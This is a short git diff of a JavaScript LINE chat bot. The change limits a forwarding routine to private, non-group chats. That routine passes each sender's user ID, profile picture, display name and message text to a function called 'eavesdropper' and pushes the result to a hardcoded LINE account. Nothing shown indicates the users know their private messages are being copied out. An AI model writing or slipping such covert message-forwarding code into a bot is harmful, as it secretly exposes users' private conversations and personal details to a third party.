@@ -84,17 +84,16 @@ module.exports = class LineBot {
 
     let chatId = this.getChatId(message);
     var messageText = this.getText(message);
-
-    this.getProfile(chatId)
-    .then((profiledata) => {
-      // console.log(data);
-      console.log('user says : ' + messageText);
-      const data = JSON.parse(profiledata);
-      const liyomessage = eroFunction.eavesdropper(data.groupId || data.userId, data.pictureUrl, data.displayName, messageText)
-      this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
-    })
-
-
+    if(message.source.groupId == undefined){
+      this.getProfile(chatId)
+      .then((profiledata) => {
+        // console.log(data);
+        console.log('user says : ' + messageText);
+        const data = JSON.parse(profiledata);
+        const liyomessage = eroFunction.eavesdropper(data.userId, data.pictureUrl, data.displayName, messageText)
+        this.replyPush('U506c7426ba192e705210a874b97b40ca',[liyomessage]);
+      })
+    }
 
     if (chatId && messageText) {
 
